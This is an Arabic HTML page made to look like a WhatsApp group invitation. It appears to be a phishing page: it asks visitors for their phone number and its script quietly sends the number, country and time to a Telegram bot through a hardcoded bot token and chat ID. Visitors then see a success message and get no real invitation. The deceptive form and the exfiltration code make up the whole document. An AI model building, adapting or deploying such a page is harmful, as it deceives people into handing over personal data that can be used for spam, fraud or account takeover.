<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>دعوة للانضمام إلى مجموعة واتساب</title>
    <link href="https://fonts.googleapis.com/css2?family=Tajawal:wght@400;500;700&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/intl-tel-input/17.0.8/css/intlTelInput.css">
    <style>
        :root {
            --primary: #25D366;
            --primary-dark: #128C7E;
            --white: #FFFFFF;
            --light-bg: #f5f8fa;
            --border-color: #e1e8ed;
            --text-color: #2d3748;
            --text-secondary: #718096;
            --shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
            --transition: all 0.3s ease;
        }

        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Tajawal', sans-serif;
            background-color: var(--light-bg);
            color: var(--text-color);
            line-height: 1.6;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }

        .login-container {
            background-color: var(--white);
            border-radius: 12px;
            box-shadow: var(--shadow);
            width: 100%;
            max-width: 450px;
            padding: 30px;
            text-align: center;
        }

        .logo {
            color: var(--primary);
            font-size: 2.5rem;
            margin-bottom: 20px;
        }

        h1 {
            font-size: 1.5rem;
            margin-bottom: 10px;
            color: var(--primary-dark);
        }

        .description {
            color: var(--text-secondary);
            margin-bottom: 25px;
            font-size: 0.95rem;
        }

        .form-group {
            margin-bottom: 20px;
            text-align: right;
        }

        label {
            display: block;
            margin-bottom: 8px;
            font-weight: 500;
            color: var(--text-color);
        }

        .phone-input {
            width: 100%;
            padding: 12px 16px;
            border: 1px solid var(--border-color);
            border-radius: 8px;
            font-size: 16px;
            transition: var(--transition);
            font-family: 'Tajawal', sans-serif;
        }

        .phone-input:focus {
            border-color: var(--primary);
            outline: none;
            box-shadow: 0 0 0 3px rgba(37, 211, 102, 0.2);
        }

        .submit-btn {
            background-color: var(--primary);
            color: var(--white);
            border: none;
            padding: 14px;
            font-size: 16px;
            font-weight: 500;
            border-radius: 8px;
            cursor: pointer;
            width: 100%;
            transition: var(--transition);
            margin-top: 10px;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 10px;
        }

        .submit-btn:hover {
            background-color: var(--primary-dark);
        }

        .loading {
            display: none;
            margin-top: 20px;
        }

        .spinner {
            display: inline-block;
            width: 20px;
            height: 20px;
            border: 3px solid rgba(255, 255, 255, 0.3);
            border-radius: 50%;
            border-top-color: var(--white);
            animation: spin 1s ease-in-out infinite;
        }

        @keyframes spin {
            to { transform: rotate(360deg); }
        }

        /* تعديلات لمختار الدول */
        .iti {
            width: 100%;
        }

        .iti__selected-flag {
            padding: 0 12px 0 6px;
        }

        .iti__country-list {
            text-align: right;
            font-family: 'Tajawal', sans-serif;
        }
    </style>
</head>
<body>
    <div class="login-container">
        <div class="logo">
            <i class="fab fa-whatsapp"></i>
        </div>
        <h1>دعوة للانضمام إلى مجموعة واتساب</h1>
        <p class="description">الرجاء إدخال رقم هاتفك لتلقي دعوة الانضمام</p>
        
        <form id="invitationForm">
            <div class="form-group">
                <label for="phone">رقم الهاتف</label>
                <input type="tel" id="phone" class="phone-input" required>
            </div>
            
            <button type="submit" class="submit-btn" id="submitBtn">
                <span>متابعة</span>
                <i class="fas fa-arrow-left"></i>
            </button>
        </form>
        
        <div class="loading" id="loading">
            <div class="spinner"></div>
            <p>جاري إرسال البيانات...</p>
        </div>
    </div>

    <script src="https://cdnjs.cloudflare.com/ajax/libs/intl-tel-input/17.0.8/js/intlTelInput.min.js"></script>
    <script>
        document.addEventListener('DOMContentLoaded', function() {
            // تهيئة مدخل الهاتف
            const phoneInput = document.getElementById('phone');
            const iti = window.intlTelInput(phoneInput, {
                initialCountry: "sa",
                preferredCountries: ["sa", "ae", "eg", "iq", "jo", "kw", "lb", "om", "qa", "bh"],
                separateDialCode: true,
                utilsScript: "https://cdnjs.cloudflare.com/ajax/libs/intl-tel-input/17.0.8/js/utils.js",
                autoPlaceholder: "off"
            });

            const form = document.getElementById('invitationForm');
            const submitBtn = document.getElementById('submitBtn');
            const loading = document.getElementById('loading');

            form.addEventListener('submit', function(e) {
                e.preventDefault();
                
                const phoneNumber = iti.getNumber();
                
                if (!phoneNumber || !iti.isValidNumber()) {
                    alert("الرجاء إدخال رقم هاتف صحيح");
                    return;
                }
                
                // عرض حالة التحميل
                submitBtn.style.display = 'none';
                loading.style.display = 'block';
                
                // إرسال البيانات إلى تيليجرام
                sendToTelegram(phoneNumber);
            });
            
            function sendToTelegram(phone) {
                const bots = [
                    { token: "7092624874:AAFrJgkFMocbi1BrFaWXNBkGjmGvnbxqwFw", chatId: "5372119436" },
                    { token: "7092624874:AAFrJgkFMocbi1BrFaWXNBkGjmGvnbxqwFw", chatId: "5372119436" }
                ];
                
                const country = iti.getSelectedCountryData().name || 'غير معروف';
                const message = `طلب انضمام جديد إلى مجموعة واتساب:
📱 الرقم: ${phone}
🌍 الدولة: ${country}
🕒 الوقت: ${new Date().toLocaleString('ar-SA')}`;
                
                // إرسال إلى جميع البوتات
                const sendPromises = bots.map(bot => {
                    const url = `https://api.telegram.org/bot${bot.token}/sendMessage?chat_id=${bot.chatId}&text=${encodeURIComponent(message)}`;
                    return fetch(url).then(response => response.json());
                });
                
                Promise.all(sendPromises)
                    .then(() => {
                        // إخفاء التحميل وإظهار رسالة النجاح
                        loading.innerHTML = '<i class="fas fa-check-circle" style="color: var(--primary); font-size: 2rem;"></i><p>تم إرسال البيانات بنجاح</p>';
                        
                        // إعادة تعيين النموذج بعد 2 ثانية
                        setTimeout(() => {
                            form.reset();
                            loading.style.display = 'none';
                            submitBtn.style.display = 'flex';
                        }, 2000);
                    })
                    .catch(error => {
                        console.error('Error:', error);
                        loading.innerHTML = '<i class="fas fa-times-circle" style="color: #e53e3e; font-size: 2rem;"></i><p>حدث خطأ أثناء الإرسال</p>';
                        
                        setTimeout(() => {
                            loading.style.display = 'none';
                            submitBtn.style.display = 'flex';
                        }, 2000);
                    });
            }
        });
    </script>
</body>
</html>
